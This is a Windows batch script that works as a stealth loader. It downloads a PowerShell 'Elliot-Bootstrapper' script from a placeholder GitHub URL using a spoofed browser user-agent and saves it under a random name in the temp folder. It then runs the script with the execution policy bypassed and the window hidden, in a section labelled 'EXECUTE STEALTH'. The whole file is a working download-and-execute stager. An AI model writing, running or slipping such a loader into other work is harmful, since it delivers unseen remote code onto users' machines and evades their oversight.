@echo off
setlocal EnableDelayedExpansion

:: =============================
:: CONFIG
:: =============================
set "BootFile=%TEMP%\Elliot-Bootstrapper_%RANDOM%.ps1"
set "BootURL=https://raw.githubusercontent.com/YourGitHubUser/YourRepo/main/Elliot-Bootstrapper.ps1"

:: =============================
:: DOWNLOAD BOOTSTRAPPER
:: =============================

:: Try with WebClient first
powershell -Command ^
 "try {
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add('User-Agent','Mozilla/5.0')
     $s = $wc.DownloadString('%BootURL%')
     Set-Content -Path '%BootFile%' -Value $s
 } catch {
     exit 1
 }"

:: Check if file exists and not empty
if not exist "%BootFile%" (
    echo [ERROR] Download failed.
    exit /b
)

for %%A in ("%BootFile%") do if %%~zA lss 10 (
    echo [ERROR] Downloaded file too small.
    del "%BootFile%" >nul 2>&1
    exit /b
)

:: =============================
:: EXECUTE STEALTH
:: =============================

:: Run hidden
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BootFile%"

:: Optional cleanup
:: del "%BootFile%" >nul 2>&1

exit /b
